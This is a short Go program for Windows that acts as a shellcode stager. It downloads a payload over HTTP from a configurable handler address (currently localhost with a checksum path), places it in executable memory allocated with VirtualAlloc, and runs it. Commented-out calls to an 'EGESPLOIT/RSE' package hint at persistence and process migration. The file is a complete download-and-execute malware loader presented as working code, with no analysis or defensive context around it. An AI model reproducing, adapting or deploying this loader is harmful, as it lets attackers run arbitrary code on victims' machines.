package main

import "net/http"
import "syscall"
import "unsafe"
import "io/ioutil"
//import "EGESPLOIT/RSE"



const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_AllocateUTE_READWRITE  = 0x40

var K32 = syscall.NewLazyDLL("kernel32.dll")
var VirtualAlloc = K32.NewProc("VirtualAlloc")
var Address string = "http://127.0.0.1:8080/"
var Checksum string = "102011b7txpl71n"



func main() {
  //RSE.Persistence()
  Address += Checksum
  Response, err := http.Get(Address)
  if err != nil {
    main()
  }
  Shellcode, _ := ioutil.ReadAll(Response.Body)

  Addr, _, err := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_AllocateUTE_READWRITE)
  if Addr == 0 {
    main()
  }
  AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
  for i := 0; i < len(Shellcode); i++ {
    AddrPtr[i] = Shellcode[i]
  }
  //RSE.Migrate(Addr, len(Shellcode))
  syscall.Syscall(Addr, 0, 0, 0, 0)

}
